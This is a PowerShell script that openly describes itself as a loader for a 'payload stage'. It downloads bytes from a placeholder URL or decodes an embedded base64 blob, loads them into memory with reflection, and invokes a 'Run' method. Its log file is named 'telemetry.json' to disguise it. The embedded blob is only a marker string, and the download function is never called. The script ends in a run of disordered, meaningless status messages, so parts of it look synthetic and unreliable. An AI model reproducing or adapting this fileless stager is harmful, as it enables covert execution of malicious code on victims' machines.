
<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://example.net/payload.bin",
    [string]$StageLog = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 30
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 30
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpqZGU0bDJqdmxk")
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($ManagedBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $OperationResult
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $ManagedBytes.Length
    Endpoint = $PayloadUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Resolving configured target"
Write-Verbose "Starting workflow"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Write-Verbose "Preparing working directory"
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Applying operation timeout"
Write-Verbose "Stage handoff finished"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
